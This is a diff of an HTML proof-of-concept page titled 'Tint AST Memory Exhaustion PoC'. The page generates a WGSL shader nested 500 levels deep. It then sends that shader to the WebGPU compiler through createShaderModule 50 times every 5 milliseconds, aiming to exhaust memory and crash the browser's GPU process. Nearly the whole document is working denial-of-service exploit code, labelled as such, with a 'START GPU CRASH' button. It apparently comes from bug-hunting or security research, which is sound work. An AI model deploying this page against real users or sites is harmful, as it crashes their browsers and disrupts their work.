@@ -1,47 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Tint Parser DoS</title>
+    <title>WebGPU Tint OOM DoS</title>
+    <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
 </head>
 <body>
-    <h2>Tint AST Recursive Depth DoS</h2>
-    <p>Clicking the button will crash the GPU Process.</p>
-    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white;">CRASH GPU</button>
+    <h2>Tint AST Memory Exhaustion PoC</h2>
+    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">START GPU CRASH</button>
+    <div id="status" style="margin-top: 20px;">Waiting...</div>
 
     <script>
-        // Generate the exact depth needed to trigger the AST state corruption
-        function generateKillerMath(depth) {
-            if (depth <= 0) return "(1.0)";
-            return `(${generateKillerMath(depth - 1)} * vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
+        const statusEl = document.getElementById('status');
+
+        function buildKillerShader() {
+            // Build a massive, deeply nested AST that pushes right up to the recursion limit
+            let mathExpr = "vec4<f32>(1.0)";
+            for (let i = 0; i < 500; i++) {
+                mathExpr = `(${mathExpr} * vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
+            }
+            return `
+                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
+                    let crazy_var = ${mathExpr};
+                    return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);
+                }
+            `;
         }
 
         async function triggerCrash() {
             if (!navigator.gpu) {
-                alert("WebGPU is not supported.");
+                statusEl.innerText = "WebGPU is not supported.";
                 return;
             }
 
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
 
-            // We generate roughly 250 nested operations.
-            // This is enough to hit the "maximum parser recursive depth reached" 
-            // and trigger the SIGTRAP in CrGpuMain.
-            const killerWGSL = `
-                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
-                    let crazy_var = ${generateKillerMath(250)};
-                    return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);
-                }
-            `;
-
-            console.log("Sending payload to Tint...");
+            statusEl.innerText = "Building payload...";
+            const killerWGSL = buildKillerShader();
             
-            try {
-                // This call crashes the GPU Process
-                device.createShaderModule({ code: killerWGSL });
-            } catch (e) {
-                console.log("Caught:", e);
-            }
+            let count = 0;
+            statusEl.innerText = "Spamming GPU Process to trigger SIGTRAP OOM...";
+
+            // We use setInterval to rapidly spam the GPU process.
+            // If Tint leaks memory during the "maximum parser recursive depth reached" error,
+            // the GPU process will rapidly consume RAM until it hits a CHECK() and dies.
+            setInterval(() => {
+                for (let i = 0; i < 50; i++) { // Fire 50 per tick
+                    count++;
+                    try {
+                        // This sends the payload over IPC to the C++ compiler
+                        device.createShaderModule({ code: killerWGSL });
+                    } catch (e) {
+                        // Ignore JS-side errors
+                    }
+                }
+                statusEl.innerText = `Sent ${count} malicious shaders. Waiting for GPU crash...`;
+            }, 5); 
         }
 
         document.getElementById('crashBtn').addEventListener('click', triggerCrash);
